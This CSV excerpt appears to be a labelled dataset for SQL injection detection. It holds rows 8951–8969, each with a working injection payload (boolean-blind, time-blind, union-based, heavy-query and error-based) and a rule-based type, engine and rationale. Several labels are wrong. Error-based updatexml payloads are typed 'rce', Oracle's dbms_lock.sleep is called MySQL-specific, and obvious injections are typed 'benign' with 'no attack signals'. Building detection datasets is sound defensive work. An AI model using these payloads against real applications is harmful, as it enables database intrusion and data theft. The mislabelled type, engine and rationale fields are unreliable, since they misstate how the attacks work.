row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8951,"1 ) ) ) and make_set ( 8882 = 1593,1593 ) and ( ( ( 7989 = 7989",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
8952,1' ) and ( 3020 = 3020 ) *6703,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
8953,else dbms_lock.sleep ( 0 ),1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8954,"1"" ) ) as qrok where 8257 = 8257 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
8955,"1"" ) ) as yuqr where 7226 = 7226 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8956,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""wdbg"" like ""wdbg",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
8957,-2658 ) as casi where 7364 = 7364 or 8245 = 9651--,1,,boolean_blind,generic,0.95,7364 = 7364 or detected — boolean_blind injection (priority 8) on generic,rule-based
8958,"1"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""tzqk"" like ""tzqk",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8959,-7984' order by 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8960,"1"" where 6352 = 6352",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8961,"1%' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8962,"-4695' ) ) ) union all select 5844,5844,5844,5844,5844,5844#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8963,-8028%' ) ) ) or 5042 = 5214,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8964,"-2382%' ) union all select 8885,8885,8885,8885,8885,8885,8885#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8965,"1"" union all select null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8966,1'|| ( select 'bifa' where 6077 = 6077 and 4547 = 9301,1,,boolean_blind,generic,0.95,6077 = 6077 and detected — boolean_blind injection (priority 8) on generic,rule-based
8967,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'xzlx' like 'xzlx",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8968,1 ) ) as ojjk where 3687 = 3687 and ( 4833 = 9218 ) *9218--,1,,boolean_blind,generic,0.95,3687 = 3687 and detected — boolean_blind injection (priority 8) on generic,rule-based
8969,"-7236 or make_set ( 9618 = 6919,6919 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
